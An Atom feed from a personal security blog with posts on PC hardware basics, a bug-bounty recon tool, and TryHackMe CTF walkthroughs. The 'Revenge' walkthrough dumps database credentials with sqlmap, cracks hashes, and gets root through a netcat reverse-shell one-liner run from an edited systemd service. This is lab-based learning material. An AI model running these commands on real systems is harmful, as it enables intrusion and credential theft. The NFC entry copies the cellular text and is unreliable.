<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-02-17T22:31:21+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Basics of Computer Technology and Networking</title><link href="http://localhost:4000/first-day-of-roadmapsh-challenge/" rel="alternate" type="text/html" title="Basics of Computer Technology and Networking" /><published>2025-02-15T00:00:00+03:00</published><updated>2025-02-15T00:00:00+03:00</updated><id>http://localhost:4000/first-day-of-roadmapsh-challenge</id><content type="html" xml:base="http://localhost:4000/first-day-of-roadmapsh-challenge/"><![CDATA[<p>Basics of Computer Technology and Networking</p>

<p><br /></p>

<h2 id="contents"><strong>Contents</strong></h2>
<ul>
  <li><a href="#computer-hardwares">Computer Hardwares</a></li>
  <li><a href="#connection-types">Connection Types</a></li>
</ul>

<p><br />
<br /></p>

<h2 id="computer-hardwares"><strong>Computer Hardwares</strong></h2>

<p>There are several different kinds of hardware inside a PC.</p>

<p><img src="/assets/img/roadmapsh-challenge/ınternal_hardware.png" alt="Internal-Hardware" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Motherboard:</code></strong> The motherboard is like the skeleton of a computer. The motherboard connects all the other hardware together.</p>

<p><strong><code class="language-plaintext highlighter-rouge">CPU (Central Processing Unit):</code></strong> The CPU is like a brain. Human has a speed of thinking and the same thing is valid for CPU and it’s measured in GHz(Gigahertz).</p>

<p><strong><code class="language-plaintext highlighter-rouge">RAM (Random Access Memory):</code></strong>  RAM is like a temporary CPU. RAM temporarily stores information and the stored data is erased each time. RAM has many important functions, including rendering images for graphic design, editing video or photos, and multitasking with multiple applications or programs open. How much RAM you need depends on the programs you’re running. It will change with new technologies. Today, 8GB of RAM is nothing. You need more than that.</p>

<p><strong><code class="language-plaintext highlighter-rouge">HDD (Hard Disk Drive) and SSD (Solid State Drive):</code></strong>  HDD and SSD are two different types of storage. HDDs are older technology and slower than SSDs. SSDs come out as the clear winner, primarily based on speed, durability, and power consumption.</p>

<p><strong><code class="language-plaintext highlighter-rouge">GPU (Graphics Processing Unit):</code></strong> GPUs process graphical data. A dedicated graphics card connects with the motherboard via an expansion slot, so you can upgrade your graphics card if you want to improve gaming, video, or visual performance from your PC. And some PC’s. Have different versions of CPUs and at that time CPUs does process graphical data.</p>

<p><strong><code class="language-plaintext highlighter-rouge">PSU (Power Supply Unit):</code></strong> A PSU takes electricity from an external power source or laptop battery and passes it to the motherboard to power individual hardware components. This makes it essential to use a power supply with suitable wattage.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="connection-types"><strong>Connection Types</strong></h2>

<p><strong><code class="language-plaintext highlighter-rouge">Ethernet:</code></strong> Ethernet is wired networking technology that allows devices to communicate within a Local Area Network (LAN). It was first developed in the 1970s by Xerox, Intel, and Digital Equipment Corporation (DEC). Ethernet’s biggest advantages are high speed, reliability, and security. Unlike wireless connections, it experiences less interference and fewer disruptions. The physical cabling also enhances security by preventing unauthorized access. However, its wired nature does come with some downsides, such as limited mobility and higher installation costs.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Wi-Fi (Wireless Fidelity):</code></strong> Wi-Fi, works by transmitting data over radio waves. Instead of using physical cables like Ethernet, Wi-Fi enables devices to send and receive information through the air. This is made possible by a router, which connects to the internet via a wired connection and then broadcasts a wireless signal that your devices can pick up.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Bluetooth:</code></strong>  Bluetooth is a wireless communication standard that enables data exchange over short distances. Operating on the 2.4 GHz ISM (Industrial, Scientific, and Medical Devices) band, it allows devices to communicate directly with each other.
The advantages of Bluetooth include low power consumption, cost-effectiveness, and universal compatibility. However, due to its limited data transfer speed and range, it may not be suitable for applications requiring high bandwidth or long-distance connectivity.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Fiber-Optic Connections:</code></strong> Fiber-optic connections use light signals through glass or plastic fibers to transmit data at very high speeds over long distances, making them ideal for internet backbones or connecting data centers. Fiber is faster and more reliable than traditional copper cables, but it is also more expensive to implement.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Cellular Connections:</code></strong> Cellular connections are a type of wireless communication technology that enables devices to connect to a mobile network for voice calls, messaging, and internet access. These networks operate through a system of cell towers that transmit signals over radio frequencies, allowing seamless connectivity even while moving between locations.
Cellular technology has evolved through multiple generations, from 1G (analog) to modern 5G, which offers ultra-fast speeds and low latency. The main advantages of cellular connections include wide coverage, mobility, and reliable internet access. However, factors like network congestion, signal interference, and data plan costs can affect performance.</p>

<p><strong><code class="language-plaintext highlighter-rouge">NFC (Near Field Communication):</code></strong> Cellular connections are a type of wireless communication technology that enables devices to connect to a mobile network for voice calls, messaging, and internet access. These networks operate through a system of cell towers that transmit signals over radio frequencies, allowing seamless connectivity even while moving between locations.
Cellular technology has evolved through multiple generations, from 1G (analog) to modern 5G, which offers ultra-fast speeds and low latency. The main advantages of cellular connections include wide coverage, mobility, and reliable internet access. However, factors like network congestion, signal interference, and data plan costs can affect performance.</p>

<p><strong><code class="language-plaintext highlighter-rouge">(IR) Infrared:)</code></strong> IR is a wireless communication technology that uses infrared light to transmit data over short distances. It operates on the electromagnetic spectrum just beyond visible light and is commonly used in remote controls, short-range data transfer, and some sensing applications.</p>

<p><br /></p>

<p>:metal: :metal:  I hope you learned something and had fun. But that’s it for now till next time take care.  :wave:</p>

<p><br />
<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Roadmapsh Challenge" /><category term="security," /><category term="cyber-security," /><category term="challange," /><summary type="html"><![CDATA[Basics of Computer Technology and Networking]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/basic_ct_n.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/basic_ct_n.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Bug Bounty Methodology, Otorecon</title><link href="http://localhost:4000/bug-bounty-methodology-oto/" rel="alternate" type="text/html" title="Bug Bounty Methodology, Otorecon" /><published>2024-02-29T00:00:00+03:00</published><updated>2024-02-29T00:00:00+03:00</updated><id>http://localhost:4000/bug-bounty-methodology-oto</id><content type="html" xml:base="http://localhost:4000/bug-bounty-methodology-oto/"><![CDATA[<p>Bug Bounty Methodology, Otorecon</p>

<p><br />
<br />
<br /></p>

<h1 align="center">
<a href="https://github.com/Mr0Wido/otorecon"><img src="https://i.hizliresim.com/s1vb4eu.png" alt="otorecon" />
</a>
</h1>

<h1 id="otorecon"><a href="https://github.com/Mr0Wido/otorecon">OTORECON</a></h1>

<p>I am building a tool for my bug bounty methodology. I will explain the tool, but first I want to explain myself and my methodology. You can get to the tool by clicking on the title.</p>

<p>First of all, I’m not a bugbounter, I don’t actually have a title in cybersecurity. But I want to have one because I’m very interested in cybersecurity. So I decided to try to get a bugbounter title first and that is my goal for now. But doing bug bounty for a job looks hard. Anyway, we use a lot of different tools and different codes in bug bounty. So I just want to combine different tools together to create and control in just one tool. Then I create <strong><code class="language-plaintext highlighter-rouge">otorecon</code></strong> tool. 
I want to do this because I believe it could be useful and good work for my portfolio.</p>

<p>I hope you like this article and the tool I created.</p>

<p>Let’s continue. Now I’m going to explain my bug bounty methodology to you, I don’t have any results yet and I don’t know if the methodology works or not, but I believe it does. The first thing I want to say is that this methodology doesn’t have a lot of detail because I created this methodology for the tool. So it’s more basic and probably has a lot of things missing, but that’s not important. I can improve this project with feedback. So I will wait for your feedback.</p>

<p><br /></p>

<hr />

<p><br />
<br /></p>

<h3 id="otorecon-workflow">Otorecon Workflow</h3>
<p><img src="https://i.hizliresim.com/lsc6sux.jpg" alt="otorecon_workflow" /></p>

<p><br /></p>

<hr />

<p><br />
<br /></p>
<h3 id="basic-scan">Basic Scan</h3>
<p>Basic scan fuction include theese tools, <a href="https://github.com/Mr0Wido/dnmasscan">dnmasscan</a> and <a href="https://github.com/urbanadventurer/WhatWeb">whatweb</a>. This fuction purpose is getting basic information about target domain. You can run this command for <strong><code class="language-plaintext highlighter-rouge">basic scan</code></strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -bs all/tools -d example.com
</code></pre></div></div>

<p>First I use <strong>masscan</strong> for the find open ports. I chose <strong>masscan</strong> because it’s fastest than <strong>nmap</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 dnmasscan.py &lt;domain_file&gt; &lt;out_file&gt;
</code></pre></div></div>

<p>Then I use <strong>whatweb</strong> for getting a lot of information about target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb -v 
</code></pre></div></div>

<p>Now we have bunch of information about target.Basic scan function save results as txt and html format.</p>

<p><br /></p>

<hr />

<p><br />
<br /></p>

<h3 id="subdomain-scan">Subdomain Scan</h3>
<p>Subdomain scan include theese tools; 
<a href="https://github.com/projectdiscovery/subfinder">subfinder</a>, <a href="https://github.com/tomnomnom/assetfinder">assetfinder</a>, <a href="https://github.com/Findomain/Findomain">findomain</a>, <a href="https://github.com/aboul3la/Sublist3r">sublist3r</a>, 
<a href="https://github.com/laramies/theHarvester?tab=readme-ov-file">theHarvester</a>, 
<a href="https://github.com/projectdiscovery/shuffledns">shuffledns</a>, <a href="https://github.com/ProjectAnte/dnsgen">dnsgen</a>, 
<a href="https://github.com/infosec-au/altdns">altdns</a>, 
<a href="https://github.com/Mr0Wido/crtsh.py">crtsh</a> and 
<a href="https://github.com/xmendez/wfuzz">wfuzz</a></p>

<p>I use a lot of tool and I use bunch of wordlists for scan. But I didn’t use some popular tools in <code class="language-plaintext highlighter-rouge">otorecon</code> because they are too slow. These tools are;  amass, subbrute.py, subdominizer it’s a good tool but it’s too slow. But I will write all of them.
Beside that this function have <strong><code class="language-plaintext highlighter-rouge">out of scope</code></strong> option. Remember I create this tool for bugbounty. So you can write out of scope domains in a file and try <strong><code class="language-plaintext highlighter-rouge">-os</code></strong> parameter. It’s required option. And if you want you can choose <strong><code class="language-plaintext highlighter-rouge">a tool</code></strong> for scan or <strong><code class="language-plaintext highlighter-rouge">all</code></strong> for all tools.
You can run this command for <strong><code class="language-plaintext highlighter-rouge">subdomain scan</code></strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -subs all/tools -d example.com
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -subs subfinder/all -d example.com -os out.txt
</code></pre></div></div>

<p><br /></p>

<hr />

<p><br />
<br /></p>

<h3 id="hard-subdomain-scan-tools">Hard Subdomain Scan Tools</h3>

<p><code class="language-plaintext highlighter-rouge">Crtsh</code> is a usefull website you can go visit <a href="https://crt.sh/">here</a> . And I write a code for getting crtsh results in terminal my code is in my github page you can download <a href="https://github.com/Mr0Wido/crtsh.py">here</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 crtsh.py -d example.com
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">theHarvester</code>, have very usefull results. You can download <a href="https://github.com/laramies/theHarvester?tab=readme-ov-file">here</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ theHarvester -d example.com -b anubis,crtsh,dnsdumpster,rapiddns,otx,urlscan,yahoo -f theHarvester_out'
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">submass</code>, I call that submass because we use subbrute.py and massdns. You can download subbrute <a href="https://github.com/TheRook/subbrute">here</a> and you can download massdns <a href="https://github.com/blechschmidt/massdns">here</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 subbrute.py example.com names.txt | massdns -r resolvers.txt -o S -w results.txt'
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">dnsgen</code>, This time we use dnsgen tool(download) and massdns. You can use domains file. I saw this code in one source which I don’t remember. I don’t know “dnsgen -“ mean. But I use in my function. You can downlad <a href="https://github.com/ProjectAnte/dnsgen">here</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat domain.file | dnsgen - | massdns -r resolvers.txt  -t A -o J --flush 2&gt;/dev/null -w result.txt'
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">wfuzz</code>, I use all.txt t’s jason haddix’s wordlists. You can download <a href="https://github.com/xmendez/wfuzz">here</a>. Also I write a tool for subdomain bruteforcing you can downlad <a href="https://github.com/Mr0Wido/bff-subdomains">here</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wfuzz -f result.txt -Z -w fierce.txt/all.txt -sc 200,202,204,301,302,403 example.com
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">altdns</code> you can download tool <a href="https://github.com/infosec-au/altdns">here</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ altdns -i domain.file -o result.txt -w words.txt'
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Subdomainizer</code>, you can download <a href="https://github.com/nsonaniya2010/SubDomainizer">here</a> this tool have usefull results like theHarvester.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ subdomanizer -h
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Shuffledns</code> You can download <a href="https://github.com/projectdiscovery/shuffledns">here</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ shuffledns -d {domain_name} -w /names.txt -r resolvers.txt -silent'
</code></pre></div></div>

<p>Now we will get results. Subdomain Scan function save results as txt and html. Also this time theHarvester can result interesting information so I save them to.</p>

<p><br /></p>

<hr />

<p><br />
<br /></p>

<h3 id="filtering">Filtering</h3>

<p>I use <a href="https://github.com/projectdiscovery/httpx">httpx</a> tool for filtering but if you want you can use <a href="https://github.com/tomnomnom/httprobe">httprobe</a> to.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -fl subdomains.txt
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">httpx</code>, you can download <a href="https://github.com/projectdiscovery/httpx">here</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ httpx -l &lt;domainlist.txt&gt; -p 443,8443,80,8080 -mc 200,202,204,301,307,403 -status-code -title 
</code></pre></div></div>

<p><br /></p>

<hr />

<p><br />
<br /></p>
<h3 id="crawling-urls">Crawling URL’s</h3>

<p>I use a lot of tool for this scan. And I parse the results of the scan. Then I have two result file. One of them just include js files. First I take this file end scan with endpointer.py. Second I take other file and use clean_subs.py this like paramspider tool.</p>

<p>All tools;</p>
<ul>
  <li><a href="https://github.com/Mr0Wido/urlcrawler.py">crawler.py</a></li>
  <li>waymac.py</li>
  <li><a href="https://github.com/Mr0Wido/commoncrawl.py">cocrawl.py</a></li>
  <li><a href="https://github.com/Mr0Wido/webarchive.py">archive.py</a></li>
  <li><a href="https://github.com/tomnomnom/waybackurls">waybackurls</a></li>
  <li><a href="https://github.com/lc/gau">gau</a></li>
  <li><a href="https://github.com/003random/getJS">getJS</a></li>
  <li><a href="https://github.com/projectdiscovery/katana">katana</a></li>
  <li><a href="https://github.com/edoardottt/cariddi">cariddi</a></li>
  <li><a href="https://github.com/hakluke/hakrawler">hakrawler</a></li>
  <li><a href="https://github.com/0xsha/GoLinkFinder">golinkFinder</a></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -cs all -cl subdomain_list.txt -cp
</code></pre></div></div>

<hr />
<p><br />
<br /></p>
<h3 id="get-screenshots">Get Screenshots</h3>

<p>I use <a href="https://github.com/sensepost/gowitness">gowitness</a> for this scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -gcs domain_list.txt
</code></pre></div></div>

<p><br /></p>

<hr />

<p><br />
<br /></p>
<h3 id="dirsearch-scan">Dirsearch Scan</h3>

<p>I use <a href="">gobuster</a> for this scan. And I use 4 wordlists. Theese are;</p>
<ul>
  <li>rd1000.txt</li>
  <li>raft.txt</li>
  <li>dirm2_3.txt</li>
  <li>dirsearch.txt</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -ds raft -dl subdomain_list.txt
</code></pre></div></div>

<p><br /></p>

<hr />

<p><br />
<br /></p>

<h3 id="full-scan">Full Scan</h3>

<p>Otorecon have full scan option. This option combine all scans each other.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 otorecon.py -fs example.com
</code></pre></div></div>

<p><br /></p>

<hr />

<p><br />
<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="bug_bounty, bug_bounty-tools, otorecon" /><summary type="html"><![CDATA[Bug Bounty Methodology, Otorecon]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/otorecon.png" /><media:content medium="image" url="http://localhost:4000/assets/img/otorecon.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Revenge</title><link href="http://localhost:4000/tryhackme-revenge/" rel="alternate" type="text/html" title="TryHackMe - Revenge" /><published>2023-07-10T00:00:00+03:00</published><updated>2023-07-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-revenge</id><content type="html" xml:base="http://localhost:4000/tryhackme-revenge/"><![CDATA[<p>You’ve been hired by Billy Joel to get revenge on Ducky Inc…the company that fired him. Can you break into the server and complete your mission?</p>

<p>Created by <a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a></p>

<p><br /></p>

<p><img src="/assets/img/tryhackme/revenge/duck.jpg" alt="duck" /></p>

<p>This is revenge! You’ve been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you’re just here for the money. Can you fulfill your end of the bargain?</p>

<p>There is a sister room to this one. If you have not completed <a href="https://tryhackme.com/room/blog">Blog</a> yet, I recommend you do so. It’s not required but may enhance the story for you.</p>

<p>All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to <a href="https://tryhackme.com/p/Varg">Varg</a>. Thanks for helping me out with this one, bud.</p>

<p>Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.</p>

<p><br /></p>

<h3 id="flag-1">Flag 1</h3>

<p><code class="language-plaintext highlighter-rouge">Billy</code> sends us a note. Let’s look at what says to us.</p>

<p><img src="/assets/img/tryhackme/revenge/billy.png" alt="billy" /></p>

<p>He gives us a <code class="language-plaintext highlighter-rouge">mission</code>. We must <code class="language-plaintext highlighter-rouge">penetrate a server</code> and <code class="language-plaintext highlighter-rouge">change the front page</code>.</p>

<p>Let’s <code class="language-plaintext highlighter-rouge">begin</code>.</p>

<p>First, let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.202.34
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/nmap.png" alt="nmap" /></p>

<p>As you can see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>

<p>Let’s explore the website.</p>

<p>Here is a <code class="language-plaintext highlighter-rouge">homepage</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/home.png" alt="home" /></p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.202.34/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/gobuster.png" alt="gobuster" /></p>

<p>We found a lot of pages. Let’s explore all of them.</p>

<p><strong><code class="language-plaintext highlighter-rouge">/contact:</code></strong> Upon examining the page, we don’t find anything particularly interesting.</p>

<p><img src="/assets/img/tryhackme/revenge/contact.png" alt="contact" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">/product:</code></strong> It looks like there are <code class="language-plaintext highlighter-rouge">four products</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/products.png" alt="products" /></p>

<p>Let’s examine these products.</p>

<p><img src="/assets/img/tryhackme/revenge/product-1.png" alt="product-1" /></p>

<p>We discover an <code class="language-plaintext highlighter-rouge">endpoint (/product/1)</code> that could be vulnerable to <code class="language-plaintext highlighter-rouge">SQL injection</code>.</p>

<p>To confirm this, we modify the endpoint to <code class="language-plaintext highlighter-rouge">/product/2-1</code> and check if we are <code class="language-plaintext highlighter-rouge">still on the /product/1 page</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/detect.png" alt="detect" /></p>

<p>Indeed, the page is vulnerable to SQL injection.</p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">sqlmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 --dbs
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/dbs.png" alt="dbs" /></p>

<p>We found the <code class="language-plaintext highlighter-rouge">duckyinc database</code>. Let’s examine this database.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc --tables
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/tables.png" alt="tables" /></p>

<p>Let’s dump <code class="language-plaintext highlighter-rouge">system_user</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc -T system_user --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/system.png" alt="system" /></p>

<p>We find <code class="language-plaintext highlighter-rouge">three users</code> and their corresponding <code class="language-plaintext highlighter-rouge">hashes</code>.</p>

<p>Let’s dump the <code class="language-plaintext highlighter-rouge">user table</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc -T user --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/user.png" alt="user" /></p>

<p><code class="language-plaintext highlighter-rouge">Well done!</code> We find the <code class="language-plaintext highlighter-rouge">first flag</code> which happens to be <code class="language-plaintext highlighter-rouge">Mandrews' credit card number</code>.</p>

<p><strong><code class="language-plaintext highlighter-rouge">/login:</code></strong></p>

<p><img src="/assets/img/tryhackme/revenge/login.png" alt="login" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">/admin:</code></strong></p>

<p><img src="/assets/img/tryhackme/revenge/admin.png" alt="admin" /></p>

<p><br /></p>

<h3 id="flag-2">Flag 2</h3>

<p>Now, let’s <code class="language-plaintext highlighter-rouge">crack the all hashes</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/all.png" alt="all" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt allhash.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/john.png" alt="john" /></p>

<p>We find <code class="language-plaintext highlighter-rouge">two passwords</code>. One for the <code class="language-plaintext highlighter-rouge">server-admin</code> and another for the <code class="language-plaintext highlighter-rouge">dgorman</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/result.png" alt="result" /></p>

<p>We try to use these passwords on the <code class="language-plaintext highlighter-rouge">login and admin pages</code>, but they <code class="language-plaintext highlighter-rouge">don't work</code>.</p>

<p>Let’s try these on <code class="language-plaintext highlighter-rouge">ssh</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh server-admin@10.10.202.34
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/ssh.png" alt="ssh" /></p>

<p>Yes, it is work. We are in the server now.</p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">flag 2</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/flag-2.png" alt="flag-2" /></p>

<p><br /></p>

<h3 id="flag-3">Flag 3</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Mission objectives</code></strong></p>

<p>Now, we need to <code class="language-plaintext highlighter-rouge">escalate our privileges</code>. We start by running the <strong><code class="language-plaintext highlighter-rouge">sudo -l</code></strong> command.</p>

<p><img src="/assets/img/tryhackme/revenge/sudo-l.png" alt="sudo-l" /></p>

<p>Which shows that we can <code class="language-plaintext highlighter-rouge">execute duckyinc.service</code> with root privileges. We examine the contents of this file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudoedit /etc/systemd/system/duckyinc.service
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/service.png" alt="service" /></p>

<p>We need to change this file.</p>

<p>First, let’s create a <code class="language-plaintext highlighter-rouge">shell.sh</code> and write in this code. (Making Sure to <code class="language-plaintext highlighter-rouge">Change the IP and Port</code> as Necessary)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/shell.png" alt="shell" /></p>

<p>Let’s <code class="language-plaintext highlighter-rouge">change the content of the duckyinc.servise</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User=root
Group=root
ExecStart=/bin/bash /home/server-admin/shell.sh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/revenge/service-2.png" alt="service-2" /></p>

<p>Now we need it set up a <code class="language-plaintext highlighter-rouge">netcat listener</code>. Then we can <code class="language-plaintext highlighter-rouge">run</code> the duckyinc.service.</p>

<p><img src="/assets/img/tryhackme/revenge/get-root.png" alt="get-root" /></p>

<p>Success! We now have <code class="language-plaintext highlighter-rouge">root access</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/root.png" alt="root" /></p>

<p><code class="language-plaintext highlighter-rouge">Remember</code> the mission. We must <code class="language-plaintext highlighter-rouge">change the front page</code> for the root flag.</p>

<p>I changed the <code class="language-plaintext highlighter-rouge">index.html</code> location on the server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mv /var/www/duckyinc/templates/index.html
</code></pre></div></div>

<p>Now, we can get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>

<p><img src="/assets/img/tryhackme/revenge/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security,sqlmap, real-world, enumeration" /><summary type="html"><![CDATA[You’ve been hired by Billy Joel to get revenge on Ducky Inc…the company that fired him. Can you break into the server and complete your mission?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/revenge.png" /><media:content medium="image" url="http://localhost:4000/assets/img/revenge.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Olympus</title><link href="http://localhost:4000/tryhackme-olympus/" rel="alternate" type="text/html" title="TryHackMe - Olympus" /><published>2023-07-08T00:00:00+03:00</published><updated>2023-07-08T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-olympus</id><content type="html" xml:base="http://localhost:4000/tryhackme-olympus/"><![CDATA[<p>Hey!</p>

<p>Start the VM here and start enumerating! The machine can take some time to start. Please allow up to 5 minutes (Sorry for the inconvenience). Bruteforcing against any login page is out of scope and should not be used.</p>

<p>If you get stuck, you can find hints that will guide you on my <a href="https://github.com/PetitPrinc3/TryHackMe-rooms/blob/main/Olympus/Hints.md">GitHub repository</a>.</p>

<p>Well… Happy hacking ^^</p>

<p>Petit Prince</p>

<p>Created by <a href="https://tryhackme.com/p/PetitPrinc3">PetitPrinc3</a></p>

<p><br /></p>

<h3 id="what-is-flag-1">What is Flag 1?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.35.164
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/nmap.png" alt="nmap" /></p>

<p>As you can see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>

<p>Let’s explore the website but we need to add <code class="language-plaintext highlighter-rouge">"olympus.thm"</code> to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>

<p><img src="/assets/img/tryhackme/olympus/etc.png" alt="etc" /></p>

<p>Here is a homepage. It seems <code class="language-plaintext highlighter-rouge">nothing</code> in there.</p>

<p><img src="/assets/img/tryhackme/olympus/home.png" alt="home" /></p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

